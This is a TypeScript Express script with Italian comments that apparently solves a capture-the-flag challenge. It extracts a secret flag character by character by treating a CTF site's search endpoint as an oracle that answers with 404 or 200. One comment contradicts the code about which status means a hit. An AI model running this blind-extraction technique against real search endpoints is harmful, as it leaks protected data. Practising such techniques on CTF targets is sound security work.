import express from "express";
import axios from "axios";

const app = express();
const PORT = 3000;

const charset =
	"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!_";
let flag = "flag{";

// Funzione per attendere un determinato numero di millisecondi
const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));

// Funzione per controllare se una stringa è la flag corretta
const checkFlag = async (testFlag: string): Promise<boolean> => {
	try {
		const response = await axios.get(
			`https://matrix-simplified.capturetheflags.site/search?s=${testFlag}`,
			{
				validateStatus: function (status) {
					return status === 200 || status === 404;
				},
			}
		);

		// Se riceviamo un 404, significa che la stringa non è stata trovata
		// Questo è ciò che vogliamo per i tentativi errati
		return response.status === 404;
	} catch (error) {
		console.error(`Errore durante la richiesta: ${error}`);
		return false;
	}
};

const findFlag = async () => {
	let currentFlag = flag;
	let found = false;

	while (!found) {
		let charFound = false;

		// Prova ogni carattere possibile
		for (const char of charset) {
			const testFlag = currentFlag + char;

			console.log(`Tentativo con: ${testFlag}`);
			await delay(100); // Aggiungi un ritardo per non sovraccaricare il server

			const isCorrect = await checkFlag(testFlag);

			if (isCorrect) {
				currentFlag = testFlag;
				charFound = true;
				console.log(`Carattere trovato! Flag parziale: ${currentFlag}`);
				break;
			}
		}

		// Se non troviamo nessun carattere valido, proviamo a chiudere la flag
		if (!charFound) {
			const finalFlag = currentFlag + "}";
			const isComplete = await checkFlag(finalFlag);

			if (isComplete) {
				currentFlag = finalFlag;
				found = true;
				console.log(`Flag completa trovata: ${currentFlag}`);
			} else {
				console.log(
					"Nessun carattere valido trovato e non possiamo chiudere la flag"
				);
				break;
			}
		}
	}

	return currentFlag;
};

app.get("/", async (req, res) => {
	console.log(`Richiesta ricevuta da ${req.ip}`);

	const result = await findFlag();
	res.send(`Flag trovata: ${result}`);
});

app.listen(PORT, () => {
	console.log(`Server in esecuzione su http://localhost:${PORT}`);
});
